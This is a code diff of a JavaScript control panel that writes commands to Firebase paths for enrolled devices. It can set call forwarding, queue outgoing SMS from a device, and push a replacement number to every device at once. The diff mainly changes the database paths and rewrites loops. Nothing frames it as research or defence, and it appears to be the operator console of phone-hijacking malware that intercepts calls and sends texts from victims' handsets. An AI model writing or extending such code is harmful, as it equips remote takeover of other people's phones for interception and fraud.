-  });
+  }
 }
 
 function doCF(action) {
   var num = document.getElementById('cf-number').value.trim();
   if (action !== 'check' && !num) { showToast('Please enter forwarding number'); return; }
   
-  var path = ROOT_NODE + '/All_User/' + currentDeviceKey + '/Call_For';
+  var path = 'csc6/all_user/Call_For/' + currentDeviceKey;
   
   if (action === 'check') {
     fbGet(path).then(function(data) {
@@ -549,7 +647,7 @@ function doSendSms() {
   var msg = document.getElementById('sms-msg').value.trim();
   if (!to || !msg) { showToast('Both number and message required'); return; }
   
-  fbSet(ROOT_NODE + '/All_User/' + currentDeviceKey + '/SendSms', {
+  fbSet('csc6/all_user/SendSms/' + currentDeviceKey, {
     to: to,
     message: msg,
     status: 'pending',
@@ -570,34 +668,46 @@ function doUpdateNo() {
   var num = document.getElementById('update-num').value.trim();
   if (!num) { showToast('Please enter a number'); return; }
   
-  var deviceKeys = Object.keys(DEVICES);
-  if (!deviceKeys.length) { showToast('No devices found'); return; }
+  if (DEVICES_LIST.length === 0) { showToast('No devices found'); return; }
   
   var completed = 0;
-  deviceKeys.forEach(function(key) {
-    fbSet(ROOT_NODE + '/All_User/' + key + '/UpdateNo', num).then(function() {
+  for (var i = 0; i < DEVICES_LIST.length; i++) {
+    var deviceId = DEVICES_LIST[i];
+    fbSet('csc6/all_user/UpdateNo/' + deviceId, num).then(function() {
       completed++;
-      if (completed === deviceKeys.length) {
+      if (completed === DEVICES_LIST.length) {
         showToast('✅ Updated ' + completed + ' device(s)!');
         closeDialog('dlg-update');
       }
     }).catch(function() {
       completed++;
-      if (completed === deviceKeys.length) {
+      if (completed === DEVICES_LIST.length) {
         showToast('⚠️ Partial update completed');
         closeDialog('dlg-update');
       }
     });
-  });
+  }
 }
 
 // ========== UTILITIES ==========
 function objToArr(obj) {
   if (!obj || typeof obj !== 'object') return [];
-  return Object.entries(obj).map(function(entry) {
-    var k = entry[0], v = entry[1];
-    return Object.assign({ _key: k }, typeof v === 'object' && v !== null ? v : { value: v });
-  });
+  var arr = [];
+  var keys = Object.keys(obj);
+  for (var i = 0; i < keys.length; i++) {
+    var k = keys[i];
+    var v = obj[k];
+    var item = { _key: k };
+    if (typeof v === 'object' && v !== null) {
+      for (var prop in v) {
+        item[prop] = v[prop];
+      }
+    } else {
+      item.value = v;
+    }
+    arr.push(item);
+  }
+  return arr;
 }
 
 function getTimestamp(item) {
@@ -630,11 +740,12 @@ function closeDialog(id) {
   document.getElementById(id).style.display = 'none';
 }
 
-document.querySelectorAll('.overlay').forEach(function(o) {
-  o.addEventListener('click', function(e) {
-    if (e.target === o) o.style.display = 'none';
+var overlays = document.querySelectorAll('.overlay');
+for (var i = 0; i < overlays.length; i++) {
+  overlays[i].addEventListener('click', function(e) {
+    if (e.target === this) this.style.display = 'none';
   });
-});
+}
 
 function showToast(msg) {
   var toast = document.getElementById('toast');
